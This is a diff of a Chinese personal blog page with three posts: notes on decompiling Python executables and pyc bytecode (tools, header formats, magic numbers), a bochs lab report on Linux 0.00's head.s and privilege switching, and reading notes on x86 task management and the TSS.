@@ -159,6 +159,525 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/25/python%E9%80%86%E5%90%91/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="hkbin">
+      <meta itemprop="description" content="hkbin hkbin hkbin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hkbin的小博客~">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/25/python%E9%80%86%E5%90%91/" class="post-title-link" itemprop="url">python逆向!</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-10-25 10:37:31 / 修改时间：10:38:17" itemprop="dateCreated datePublished" datetime="2023-10-25T10:37:31+08:00">2023-10-25</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/reverse/" itemprop="url" rel="index"><span itemprop="name">reverse</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>370</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>1 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="总述"><a href="#总述" class="headerlink" title="总述"></a>总述</h1><p>主要分为三种，python编译的可执行程序、pyc字节码、dis反编译的代码。</p>
+<h1 id="打法"><a href="#打法" class="headerlink" title="打法"></a>打法</h1><h2 id="手撸！"><a href="#手撸！" class="headerlink" title="手撸！"></a>手撸！</h2><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-246683.htm">[原创]死磕python字节码-手工还原python源码-软件逆向-看雪-安全社区|安全招聘|kanxue.com</a></p>
+<h2 id="自动化工具"><a href="#自动化工具" class="headerlink" title="自动化工具"></a>自动化工具</h2><h3 id="可执行程序"><a href="#可执行程序" class="headerlink" title="可执行程序"></a>可执行程序</h3><p>用到的工具有</p>
+<p><a target="_blank" rel="noopener" href="http://pyinstxtractor.py/">pyinstxtractor.py</a> → 可以将exe转字节码</p>
+<p>转成字节码之后头部是有缺失的(头部版本magic等缺失</p>
+<p>要把struct这个文件的头部丢过去(winhex等</p>
+<p>转成字节码之后看pyc字节码的处理方法</p>
+<p><a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/415072339">爆强！将 exe 文件反编译成 Python 脚本！ - 知乎 (zhihu.com)</a></p>
+<h3 id="pyc字节码"><a href="#pyc字节码" class="headerlink" title="pyc字节码"></a>pyc字节码</h3><p>主要有两个低版本可看uncompyle6</p>
+<p>高版本可看pycdc</p>
+<p>pycdc处理效果好</p>
+<h3 id="dis反编译的代码"><a href="#dis反编译的代码" class="headerlink" title="dis反编译的代码"></a>dis反编译的代码</h3><p>可以试试pycdc里面的pycdas</p>
+<p>如果所有方法都不行可以问问AI</p>
+<h2 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Python3<span class="number">.3</span> 以下版本： 只有Magic Number和四位时间戳</span><br><span class="line">Python3<span class="number">.3</span>(包含) - Python3<span class="number">.7</span>(不包含)版本： <span class="number">4</span>个字节的magic num + <span class="number">8</span>个字节的时间戳，这个时间戳可以全是<span class="number">0</span>。</span><br><span class="line">Python3<span class="number">.7</span>(包含)版本： <span class="number">4</span>个字节的magic num + <span class="number">4</span>个字节的空白数据 + <span class="number">4</span>个字节的时间戳 + <span class="number">4</span>个字节的文件长度，除了magic num，其它数据可以全是<span class="number">0</span>。</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">enum PycMagic &#123;</span><br><span class="line">    MAGIC_1_0 = <span class="number">0x00999902</span>,</span><br><span class="line">    MAGIC_1_1 = <span class="number">0x00999903</span>,</span><br><span class="line">    MAGIC_1_3 = <span class="number">0x0A0D2E89</span>,</span><br><span class="line">    MAGIC_1_4 = <span class="number">0x0A0D1704</span>,</span><br><span class="line">    MAGIC_1_5 = <span class="number">0x0A0D4E99</span>,</span><br><span class="line">    MAGIC_1_6 = <span class="number">0x0A0DC4FC</span>,</span><br><span class="line"></span><br><span class="line">    MAGIC_2_0 = <span class="number">0x0A0DC687</span>,</span><br><span class="line">    MAGIC_2_1 = <span class="number">0x0A0DEB2A</span>,</span><br><span class="line">    MAGIC_2_2 = <span class="number">0x0A0DED2D</span>,</span><br><span class="line">    MAGIC_2_3 = <span class="number">0x0A0DF23B</span>,</span><br><span class="line">    MAGIC_2_4 = <span class="number">0x0A0DF26D</span>,</span><br><span class="line">    MAGIC_2_5 = <span class="number">0x0A0DF2B3</span>,</span><br><span class="line">    MAGIC_2_6 = <span class="number">0x0A0DF2D1</span>,</span><br><span class="line">    MAGIC_2_7 = <span class="number">0x0A0DF303</span>,</span><br><span class="line"></span><br><span class="line">    MAGIC_3_0 = <span class="number">0x0A0D0C3A</span>,</span><br><span class="line">    MAGIC_3_1 = <span class="number">0x0A0D0C4E</span>,</span><br><span class="line">    MAGIC_3_2 = <span class="number">0x0A0D0C6C</span>,</span><br><span class="line">    MAGIC_3_3 = <span class="number">0x0A0D0C9E</span>,</span><br><span class="line">    MAGIC_3_4 = <span class="number">0x0A0D0CEE</span>,</span><br><span class="line">    MAGIC_3_5 = <span class="number">0x0A0D0D16</span>,</span><br><span class="line">    MAGIC_3_5_3 = <span class="number">0x0A0D0D17</span>,</span><br><span class="line">    MAGIC_3_6 = <span class="number">0x0A0D0D33</span>,</span><br><span class="line">    MAGIC_3_7 = <span class="number">0x0A0D0D42</span>,</span><br><span class="line">    MAGIC_3_8 = <span class="number">0x0A0D0D55</span>,</span><br><span class="line">    MAGIC_3_9 = <span class="number">0x0A0D0D61</span>,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/23/os%E5%AE%9E%E9%AA%8Clab1/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="hkbin">
+      <meta itemprop="description" content="hkbin hkbin hkbin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hkbin的小博客~">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/23/os%E5%AE%9E%E9%AA%8Clab1/" class="post-title-link" itemprop="url">os实验lab1</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-10-23 21:03:05 / 修改时间：21:04:32" itemprop="dateCreated datePublished" datetime="2023-10-23T21:03:05+08:00">2023-10-23</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">操作系统</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>1k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>4 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="bochs调试Linux0-00"><a href="#bochs调试Linux0-00" class="headerlink" title="bochs调试Linux0.00"></a>bochs调试Linux0.00</h1><h1 id="实验报告"><a href="#实验报告" class="headerlink" title="实验报告"></a>实验报告</h1><h3 id="请简述-head-s-的工作原理"><a href="#请简述-head-s-的工作原理" class="headerlink" title="请简述 head.s 的工作原理"></a>请简述 <code>head.s</code> 的工作原理</h3><p>head.s工作中主要包括初始化和任务切换两部分：</p>
+<p>初始化部分主要是重新建立和设置IDT和GDT表，以及设置中断计时器，构建IDT表里的中断门描述符和系统调用陷阱门描述符等。</p>
+<p>之后执行到任务0，在中断计时器的作用下，实现任务0和任务1之间的切换操作。</p>
+<h3 id="head-s-的内存分布状况，写明每个数据段，代码段，栈段的起始与终止的内存地址"><a href="#head-s-的内存分布状况，写明每个数据段，代码段，栈段的起始与终止的内存地址" class="headerlink" title="head.s 的内存分布状况，写明每个数据段，代码段，栈段的起始与终止的内存地址"></a><code>head.s</code> 的内存分布状况，写明每个数据段，代码段，栈段的起始与终止的内存地址</h3><p>刚跳转到0x0的时候：</p>
+<p>数据段起始地址为0x00000000，终止地址为0x007fffff</p>
+<p>代码段起始地址为0x00007c00，终止地址为0x00007c00+0x0000ffff</p>
+<p>栈段起始地址为0x00007c00，终止地址为0x00007c00+0x0000ffff</p>
+<p><img src="/./images/lab01/Untitled.png" alt="Untitled"></p>
+<p>初始化结束：</p>
+<p>数据段起始地址为0x00000000，终止地址为0x007fffff</p>
+<p>代码段起始地址为0x00000000，终止地址为0x007fffff</p>
+<p>栈段起始地址为0x00000000，终止地址为0x007fffff</p>
+<p><img src="/./images/lab01/Untitled%201.png" alt="Untitled"></p>
+<p>切换到任务0：</p>
+<p>数据段起始未初始化</p>
+<p>代码段起始地址为0x00000000，终止地址为0x003fffff</p>
+<p>栈段起始地址为0x00000000，终止地址为0x007fffff</p>
+<p><img src="/./images/lab01/Untitled%202.png" alt="Untitled"></p>
+<p>初始化完：</p>
+<p>数据段起始地址为0x00000000，终止地址为0x003fffff</p>
+<p>代码段起始地址为0x00000000，终止地址为0x003fffff</p>
+<p>栈段起始地址为0x00000000，终止地址为0x003fffff</p>
+<p><img src="/./images/lab01/Untitled%203.png" alt="Untitled"></p>
+<h3 id="简述-head-s-57-至-62-行在做什么？"><a href="#简述-head-s-57-至-62-行在做什么？" class="headerlink" title="简述 head.s 57 至 62 行在做什么？"></a>简述 <code>head.s</code> <code>57</code> 至 <code>62</code> 行在做什么？</h3><p>汇编指令：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pushl $0x17 ;任务0当前局部空间数据段(堆栈段)选择符入栈</span><br><span class="line">pushl $init_stack ;将堆栈指针入栈,也可以直接把ESP入栈</span><br><span class="line">pushfl ;将标志寄存器入栈</span><br><span class="line">pushl $0x0f ;把当前局部空间代码段选择符入栈</span><br><span class="line">pushl $task0 ;将代码指针入栈</span><br><span class="line">iret ;执行中断返回指令,从而切换到特权级3的任务0中执行</span><br></pre></td></tr></table></figure>
+
+<p>也就是这个时候要进行内核态到用户态之间的切换，从内核程序将控制权转移给任务0程序。</p>
+<p>所以按顺序压栈了各种寄存器以及段选择符。</p>
+<p>之所以要压栈+iret实现内核态到用户态的访问，</p>
+<p><strong>内核是不会调用用户层的代码，要想实现这逆向的转移，一般做法是在用户进程的核心栈 (tss-&gt;esp0)压入用户态的SS,ESP,EFLAGS,CS,EIP,伪装成用户进程是通过陷阱门进入核心态，之后通过iret返回用户态</strong></p>
+<h3 id="简述-iret-执行后，-pc-如何找到下一条指令？"><a href="#简述-iret-执行后，-pc-如何找到下一条指令？" class="headerlink" title="简述 iret 执行后， pc 如何找到下一条指令？"></a>简述 <code>iret</code> 执行后， <code>pc</code> 如何找到下一条指令？</h3><p>iret等价于</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pop ip</span><br><span class="line">pop cs</span><br><span class="line">pop eflags</span><br><span class="line">pop esp</span><br><span class="line">pop ss</span><br></pre></td></tr></table></figure>
+
+<p>所以iret执行后，会重置大部分寄存器，这个时候ip寄存器发生变化，pc就能找到下一条指令了。</p>
+<h3 id="记录-iret-执行前后，栈是如何变化的？"><a href="#记录-iret-执行前后，栈是如何变化的？" class="headerlink" title="记录 iret 执行前后，栈是如何变化的？"></a>记录 <code>iret</code> 执行前后，栈是如何变化的？</h3><p>iret前栈帧：</p>
+<p><img src="/./images/lab01/Untitled%204.png" alt="Untitled"></p>
+<p><img src="/./images/lab01/Untitled%205.png" alt="Untitled"></p>
+<p>iret后：</p>
+<p><img src="/./images/lab01/Untitled%206.png" alt="Untitled"></p>
+<p><img src="/./images/lab01/Untitled%207.png" alt="Untitled"></p>
+<p>可见，主要的有关栈的变化在于ss段寄存器，这里从0x0010变为了0x0017，段选择子发生了变化，选择了不同的段，对内存访问权限发生了变化等，表明从内核态转移到了用户态，访问的是权限等级为用户等级的栈段。</p>
+<h3 id="当任务进行系统调用时，即-int-0x80-时，记录栈的变化情况。"><a href="#当任务进行系统调用时，即-int-0x80-时，记录栈的变化情况。" class="headerlink" title="当任务进行系统调用时，即 int 0x80 时，记录栈的变化情况。"></a>当任务进行系统调用时，即 <code>int 0x80</code> 时，记录栈的变化情况。</h3><p>切换到任务0之后在0x10e9、0x10fd</p>
+<p>系统调用号0x41和0x42</p>
+<table>
+<thead>
+<tr>
+<th>66</th>
+<th>sys_setsid</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>65</td>
+<td>sys_getpgrp</td>
+</tr>
+</tbody></table>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/xiaominthere/article/details/17287965">Linux系统调用 int 80h int 0x80-CSDN博客</a></p>
+<p>不过该系统调用是进入了我们写好的内核段代码，不会执行上面的linux系统调用列表，这里相当于布置了一个陷阱，int80将会进入我们的函数里。</p>
+<p>实际上这段汇编是在无限循环打印A</p>
+<p>每次int80 不都会进入一个函数，这个函数是内核态的，用于打印一个字符。</p>
+<p><img src="/./images/lab01/Untitled%208.png" alt="Untitled"></p>
+<p>int80实现了用户态到内核态的切换，随后从内核态通过iret返回用户态</p>
+<p>切换前：</p>
+<p><img src="/./images/lab01/Untitled%209.png" alt="Untitled"></p>
+<p><img src="/./images/lab01/Untitled%2010.png" alt="Untitled"></p>
+<p>切换后：</p>
+<p><img src="/./images/lab01/Untitled%2011.png" alt="Untitled"></p>
+<p><img src="/./images/lab01/Untitled%2012.png" alt="Untitled"></p>
+<p>发生了四个寄存器的切换，切换到了中断处理函数那里，所以cs、ss段寄存器发生了变化。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2023/10/22/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B004/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.png">
+      <meta itemprop="name" content="hkbin">
+      <meta itemprop="description" content="hkbin hkbin hkbin">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="hkbin的小博客~">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/10/22/os%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B004/" class="post-title-link" itemprop="url">os读书笔记04</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+              
+
+              <time title="创建时间：2023-10-22 22:01:45 / 修改时间：22:03:24" itemprop="dateCreated datePublished" datetime="2023-10-22T22:01:45+08:00">2023-10-22</time>
+            </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/" itemprop="url" rel="index"><span itemprop="name">操作系统</span></a>
+                </span>
+            </span>
+
+          <br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="far fa-file-word"></i>
+              </span>
+              <span>4.5k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="far fa-clock"></i>
+              </span>
+              <span>16 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h1 id="os读书笔记4"><a href="#os读书笔记4" class="headerlink" title="os读书笔记4"></a>os读书笔记4</h1><h1 id="任务管理"><a href="#任务管理" class="headerlink" title="任务管理"></a>任务管理</h1><h2 id="4-1任务管理概述"><a href="#4-1任务管理概述" class="headerlink" title="4.1任务管理概述"></a>4.1任务管理概述</h2><h3 id="•-什么是任务？"><a href="#•-什么是任务？" class="headerlink" title="• 什么是任务？"></a>• 什么是任务？</h3><p>任务通常指的是一个正在执行的程序或程序的一部分，任务是处理器可以调度、执行和挂起的工作单元。每个任务都拥有自己的需求和目标，并且任务自身由一系列的指令构成。这些指令都是由计算机的CPU来执行的。</p>
+<h3 id="•-80x86-提供了哪些硬件支持？"><a href="#•-80x86-提供了哪些硬件支持？" class="headerlink" title="• 80x86 提供了哪些硬件支持？"></a>• <code>80x86</code> 提供了哪些硬件支持？</h3><p>IA-32 体系结构提供了一种机制，用于保存任务的状态、调度任务以执行以及用于从一个任务切换到另一个任务。</p>
+<p>在保护模式下运行时，所有处理器执行都从在任务中。即使是简单的系统也必须定义至少一个任务。更复杂的系统可以使用处理器的支持多任务应用程序的任务管理工具。</p>
+<h3 id="•-描述符表中与任务相关的描述符有哪些？"><a href="#•-描述符表中与任务相关的描述符有哪些？" class="headerlink" title="• 描述符表中与任务相关的描述符有哪些？"></a>• 描述符表中与任务相关的描述符有哪些？</h3><p>主要有TSS(Task-State Segment)、Task Register、CR3寄存器</p>
+<p><img src="/./images/images/Untitled.png" alt="Untitled"></p>
+<h3 id="•-任务切换与过程调用的区别是什么？"><a href="#•-任务切换与过程调用的区别是什么？" class="headerlink" title="• 任务切换与过程调用的区别是什么？"></a>• 任务切换与过程调用的区别是什么？</h3><p>任务切换是指在多任务操作系统中，从当前任务切换到另外一个任务的过程(Task Swithing)，这个切换过程伴随着上下文的切换，由操作系统执行的。而过程调用是一段代码调用另一段代码的过程，不会有上下文的切换，但是有栈帧的变动，用于实现模块化的程序设计。</p>
+<h2 id="4-1-1-任务的结构"><a href="#4-1-1-任务的结构" class="headerlink" title="4.1.1. 任务的结构"></a><strong><strong>4.1.1. 任务的结构</strong></strong></h2><h3 id="•-一个任务由几部分构成？"><a href="#•-一个任务由几部分构成？" class="headerlink" title="• 一个任务由几部分构成？"></a>• 一个任务由几部分构成？</h3><p>一个任务主要由五部分构成：</p>
+<ul>
+<li>TSS任务段</li>
+<li>任务门描述符</li>
+<li>任务段描述子</li>
+<li>任务寄存器</li>
+<li>EFLAGS中的NT标志位寄存器</li>
+</ul>
+<h3 id="•-任务执行空间包括什么？"><a href="#•-任务执行空间包括什么？" class="headerlink" title="• 任务执行空间包括什么？"></a>• 任务执行空间包括什么？</h3><p>需要两部分，一部分是动态空间，另一部分是静态空间。</p>
+<p>动态空间：</p>
+<p><img src="/./images/images/Untitled%201.png" alt="Untitled"></p>
+<p>动态空间里主要包括</p>
+<p>寄存器、内存堆栈、地址映射、链接部分等。</p>
+<p>静态空间：</p>
+<p>静态空间主要包括CR3控制器、特权等级空间、I&#x2F;O map映射区域等</p>
+<h3 id="•-为什么会有多个特权级栈空间？"><a href="#•-为什么会有多个特权级栈空间？" class="headerlink" title="• 为什么会有多个特权级栈空间？"></a>• 为什么会有多个特权级栈空间？</h3><p>区分多个特权级栈空间是为了实现操作系统的特权级别和保护机制。</p>
+<p>在操作系统中，通常会划分为多个特权级别，如内核态和用户态。内核态具有较高的特权级别，可以执行特权指令和访问受限资源，而用户态的特权级别较低，只能执行受限的操作。为了实现这种特权级别的划分，需要为每个特权级别分配独立的栈空间。</p>
+<h2 id="4-1-2-任务状态"><a href="#4-1-2-任务状态" class="headerlink" title="4.1.2. 任务状态"></a><strong><strong>4.1.2. 任务状态</strong></strong></h2><h3 id="•-当前正在执行的任务状态包括哪些内容？"><a href="#•-当前正在执行的任务状态包括哪些内容？" class="headerlink" title="• 当前正在执行的任务状态包括哪些内容？"></a>• 当前正在执行的任务状态包括哪些内容？</h3><p>• 任务的当前执行空间，由段寄存器中的段选择器（CS、DS、SS、ES、FS 和 GS）。<br>• 通用寄存器的状态。<br>• EFLAGS寄存器的状态。<br>• EIP 寄存器的状态。<br>• 控制寄存器CR3的状态。<br>• 任务寄存器的状态。<br>• LDTR登记册的状态。<br>• I&#x2F;O 映射基址和 I&#x2F;O 映射（包含在 TSS 中）。<br>• 堆栈指针指向权限 0、1 和 2 堆栈（包含在 TSS 中）。<br>• 链接到以前执行的任务（包含在 TSS 中）。</p>
+<h3 id="•-掌握每一个被包含内容的含义？"><a href="#•-掌握每一个被包含内容的含义？" class="headerlink" title="• 掌握每一个被包含内容的含义？"></a>• 掌握每一个被包含内容的含义？</h3><p>主要分为了四部分，寄存器、IO映射关系、带有权限等级的堆栈、以前任务的link。</p>
+<p>寄存器就不用多说了，记录着当前任务的状态，带有权限等级的堆栈也一样，记录着当前任务的堆栈状态。</p>
+<p>这里的IO映射关系实则指I&#x2F;O Permission Bitmap，也就是I&#x2F;O许可位图，在TSS段的+102 Bytes偏移处，保存着I&#x2F;O位图基址的值，每一个任务都有一个I&#x2F;O位图。</p>
+<p>I&#x2F;O位图保存着一些flags位，用来指示任务是否具有这个IO的访问权限，<strong>让同一特权级下的不同任务也可以有不同的I&#x2F;O访问权限</strong>。</p>
+<p>以前任务的地址，这个是用来切换任务的，当当前任务执行完毕要切换到之前的任务的时候，通过这个地址来进行访问。</p>
+<h3 id="•-为什么要包含这些内容？"><a href="#•-为什么要包含这些内容？" class="headerlink" title="• 为什么要包含这些内容？"></a>• 为什么要包含这些内容？</h3><p>具有了这些内容之后，可以流畅优秀地执行上下文切换，也就是从当前任务切换到下一个任务，再从下一个任务切换回当前任务，都能保证任务的执行数据不丢失。</p>
+<h2 id="4-1-3-任务的执行"><a href="#4-1-3-任务的执行" class="headerlink" title="4.1.3. 任务的执行"></a><strong><strong>4.1.3. 任务的执行</strong></strong></h2><h3 id="•-任务的执行方式有几种？"><a href="#•-任务的执行方式有几种？" class="headerlink" title="• 任务的执行方式有几种？"></a>• 任务的执行方式有几种？</h3><p>主要有五种</p>
+<ul>
+<li>使用CALL指令显式返回</li>
+<li>使用JMP指令显式跳转</li>
+<li>中断处理隐式跳转</li>
+<li>对异常处理程序任务的隐式调用</li>
+<li>在EFLAGS寄存器中设置NT标志时返回(使用IRET指令的时候自动)</li>
+</ul>
+<h3 id="•-熟悉掌握每一种执行方式的过程"><a href="#•-熟悉掌握每一种执行方式的过程" class="headerlink" title="• 熟悉掌握每一种执行方式的过程"></a>• 熟悉掌握每一种执行方式的过程</h3><p>CALL显示调用：通过压栈弹栈的方式保存上下文，再通过CALL指令改变RIP跳转到任务地址。</p>
+<p>JMP指令显示跳转：JMP指令只改变RIP，需要在前面保存好上下文相关信息，JMP可以直接跳转到任务地址。</p>
+<p>中断处理隐式跳转：中断处理的时候，程序会自动保存上下文信息，当前任务会滞留，然后操作系统调度器会从准备队列中选出一个新任务，CPU跳转到新任务进行执行，前任务中断处理完成，发出中断，响应中断的时候再返回到前任务。</p>
+<p>对异常处理程序任务的隐式调用：和中断处理类似，程序运行抛出异常，操作系统会根据异常处理向量表找到对应的异常处理程序，然后保存上下文，当前任务滞留，CPU选择执行下一任务，之后再返回(可能不返回)。</p>
+<p>在EFLAGS寄存器中设置NT标志时返回(使用IRET指令的时候自动)：在发生中断或异常时，异常处理程序可以将NT标志设置为使得处理器在返回到外层任务时，可以执行内层任务的处理，所以设置了NT标志，IRET的时候将会自动返回。</p>
+<h3 id="•-Linux-0-00-用的是哪种方式？"><a href="#•-Linux-0-00-用的是哪种方式？" class="headerlink" title="• Linux 0.00 用的是哪种方式？"></a>• <code>Linux 0.00</code> 用的是哪种方式？</h3><p>使用的是中断处理隐式跳转的方式。</p>
+<p><img src="/./images/images/Untitled%202.png" alt="Untitled"></p>
+<h3 id="•-任务可以递归调用吗？为什么？"><a href="#•-任务可以递归调用吗？为什么？" class="headerlink" title="• 任务可以递归调用吗？为什么？"></a>• 任务可以递归调用吗？为什么？</h3><p>可以递归调用，比方说中断处理在在跳转到另外任务的时候，又遇到了中断，再次跳转到另外的任务。其TSS里面可以构成一条任务调用链。</p>
+<h2 id="4-2-任务的数据结构"><a href="#4-2-任务的数据结构" class="headerlink" title="4.2. 任务的数据结构"></a><strong><strong>4.2. 任务的数据结构</strong></strong></h2><h3 id="•-任务状态段-Task-State-Segment-TSS"><a href="#•-任务状态段-Task-State-Segment-TSS" class="headerlink" title="• 任务状态段 Task-State Segment (TSS)"></a>• 任务状态段 Task-State Segment (TSS)</h3><p><img src="/./images/images/Untitled%203.png" alt="Untitled"></p>
+<p>数据结构如下，总长104Bytes</p>
+<h3 id="•-TSS-描述符"><a href="#•-TSS-描述符" class="headerlink" title="• TSS 描述符"></a>• <code>TSS</code> 描述符</h3><p><img src="/./images/images/Untitled%204.png" alt="Untitled"></p>
+<ul>
+<li>TSS（任务状态段）：TSS是一种数据结构，包含了任务的上下文和状态信息，用于在任务切换时保存和恢复任务的执行环境。</li>
+<li>Base（基址）：指定了TSS在内存中的起始位置。</li>
+<li>Limit（限长）：指定了TSS在内存中的大小，以字节为单位。限长字段的值需大于等于67H。</li>
+<li>DPL（描述符特权级）：TSS描述符中的DPL字段指定了可以访问该TSS的程序或过程的特权级。只有特权级小于等于TSS描述符的DPL的程序或过程才能调度和切换任务。</li>
+<li>Granularity（粒度）：粒度标志指示了限长字段的粒度，其中0表示限长按字节表示，1表示限长乘以4K（4096）来表示。</li>
+<li>Present（存在标志）：存在标志指示TSS是否在内存中存在。</li>
+<li>G（Granularity）标志：用于指示限长字段的粒度，默认为0，表示限长按字节表示。</li>
+<li>I&#x2F;O Permission Bit Map（输入&#x2F;输出权限位图）：如果在TSS中包含了I&#x2F;O权限位图，则需要更大的限长来存储这些额外的数据。</li>
+</ul>
+<h3 id="•-任务寄存器"><a href="#•-任务寄存器" class="headerlink" title="• 任务寄存器"></a>• 任务寄存器</h3><p><img src="/./images/images/Untitled%205.png" alt="Untitled"></p>
+<p>任务寄存器如图所示分为三个PART。</p>
+<p>通过可见的部分来进行GDT表访问TSS段描述符，再通过不可见部分来进行查询TSS段</p>
+<h3 id="•-任务门描述符-Task-Gate-Descriptor"><a href="#•-任务门描述符-Task-Gate-Descriptor" class="headerlink" title="• 任务门描述符 Task-Gate Descriptor"></a>• 任务门描述符 Task-Gate Descriptor</h3><p><img src="/./images/images/Untitled%206.png" alt="Untitled"></p>
+<ul>
+<li>任务门（Task Gate）描述符：任务门描述符是一种数据结构，提供对任务的间接、受保护的引用。它可以放置在全局描述符表（GDT）、局部描述符表（LDT）或中断描述符表（IDT）中。</li>
+<li>TSS（任务状态段）段选择符字段：任务门描述符中的TSS段选择符字段指向全局描述符表（GDT）中的一个TSS描述符。</li>
+<li>RPL（请求特权级）：任务门描述符中TSS段选择符字段的RPL字段是不使用的，它不影响任务切换的访问权限。</li>
+<li>任务门描述符的DPL（描述符特权级）：任务门描述符的DPL字段控制任务切换期间对TSS描述符的访问。当一个程序或过程通过任务门进行调用或跳转到一个任务时，任务门选择符的CPL（当前特权级）和RPL字段必须小于等于任务门描述符的DPL。</li>
+</ul>
+<p>具体可以参考别的门描述符。</p>
